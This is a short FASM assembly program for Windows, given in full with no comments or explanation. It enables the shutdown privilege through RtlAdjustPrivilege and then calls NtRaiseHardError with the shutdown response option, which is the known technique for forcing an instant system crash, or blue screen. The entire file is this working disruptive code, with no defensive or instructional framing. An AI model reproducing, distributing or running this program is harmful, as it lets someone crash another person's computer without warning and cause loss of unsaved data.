format PE GUI
include 'win32a.inc';

mov eax,enabled
invoke RtlAdjustPrivilege,19,1,0,eax
invoke NtRaiseHardError,0xc000000A,0,0,NULL,6,retval
retn

retval dw ?
enabled dd ?

data import
  library ntdll, 'ntdll.dll'
  import ntdll,\
     RtlAdjustPrivilege,'RtlAdjustPrivilege',\
     NtRaiseHardError,'NtRaiseHardError'
end data